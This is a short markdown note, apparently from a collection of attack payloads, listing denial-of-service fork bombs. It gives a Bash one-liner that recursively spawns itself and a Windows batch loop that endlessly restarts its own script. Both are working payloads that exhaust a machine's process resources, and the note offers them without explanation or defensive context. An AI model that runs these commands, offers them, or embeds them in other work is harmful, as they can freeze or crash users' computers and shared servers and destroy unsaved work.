# DOS

## Fork Bombs

* Bash

    ```
    :() { :|:&};:
    ```

* Bat (Windows)

    ```
    :runthis
    start %0
    goto runthis
    ```